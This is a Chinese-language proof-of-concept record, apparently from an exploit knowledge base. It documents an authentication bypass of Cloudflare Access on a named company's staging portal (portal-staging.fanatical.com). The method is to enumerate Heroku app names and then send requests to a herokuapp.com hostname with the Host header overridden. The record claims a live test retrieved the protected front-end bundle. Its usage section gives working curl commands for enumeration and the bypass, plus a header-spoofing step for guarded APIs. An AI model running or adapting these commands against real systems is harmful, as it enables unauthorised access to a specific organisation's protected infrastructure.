# Heroku 自定义域「反向找 app」法：用 herokuapp.com 主机名 + Host 覆盖绕过 Cloudflare Access 读取受保护前端（fanatical portal-staging 实证）

- **code**: heroku-自定义域-反向找-app-法-用-herokuapp.com-主机名-host-覆盖绕过-cloudf
- **kind**: poc
- **category**: auth-bypass
- **component**: Heroku / Cloudflare Access / Vite SPA
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测：portal-staging.fanatical.com 公网 302→fanatical.cloudflareaccess.com（CF Access）；对 portal-prod.herokuapp.com 发 `-H 'Host: portal-staging.fanatical.com'` GET / → HTTP 200 / 520B Vite index，再取 /assets/index-Ci7OJKgw.js → 200 / 936,101B（含 VITE_API_URL=https://staging.fanatical.com/api/publisher-portal）。同 app 带 Host: portal.fanatical.com → 404 555B（说明按 Host 路由到声明该域的 app）。portal-stage.herokuapp.com 同法同样 200/520B。全程 --noproxy '*'。
- **tags**: heroku, herokudns, cloudflare-access, host-header, vhost-routing, app-name-enumeration, fanatical, portal-staging, spa-bundle
- **created_at**: 2026-11-11T18:12:53.667Z
- **engine**: portal-staging.fanatical.com / portal-prod.herokuapp.com

## 描述

Heroku 路由器按请求 Host 匹配「该自定义域由哪个 app 声明」。因此当目标域被 Cloudflare Access 保护、且目标域本身的 herokudns 目标不暴露/NODATA 时，可以反过来枚举 Heroku app 名（*.herokuapp.com，404「No such app」=不存在、503 Application Error=app 存在但 dyno 未起、403 守卫文案=存在且有 Host 守卫），找到声明该自定义域的 app，然后用该 app 的 herokuapp.com 主机名做 TLS SNI（证书有效）+ 请求头 Host: <目标自定义域>，Heroku 会把请求路由到同一 app，从而完全绕开前置的 Cloudflare Access，读取受保护 SPA/前端产物。

## 用法

```
# 1) 目标域公网被 CF Access（302 到 <team>.cloudflareaccess.com）且 herokudns 无记录时：
nslookup -type=A portal-staging.fanatical.com.herokudns.com 1.1.1.1   # NODATA
# 2) 枚举 Heroku app 名（404=不存在；503=存在但 dyno 未起；403=存在且有守卫）
for n in portal-prod portal-stage fan-portal ...; do
  curl -sk -m 12 -o /dev/null -w "$n %{http_code} %{size_download}\n" -A "$UA" "https://$n.herokuapp.com/"
done
# 3) 用存活 app 的 herokuapp 主机名 + Host 覆盖目标域，绕过 CF Access：
curl -sk --noproxy '*' -A "$UA" -H 'Host: portal-staging.fanatical.com' https://portal-prod.herokuapp.com/
# => HTTP 200，520B Vite index；再拉 /assets/index-*.js 得全量 bundle
# 4) 若目标 API 另有 Host 守卫（如 fan-api-*），叠加 X-Forwarded-Host: 期望域 + 任意 X-Forwarded-For 即可进业务逻辑
```
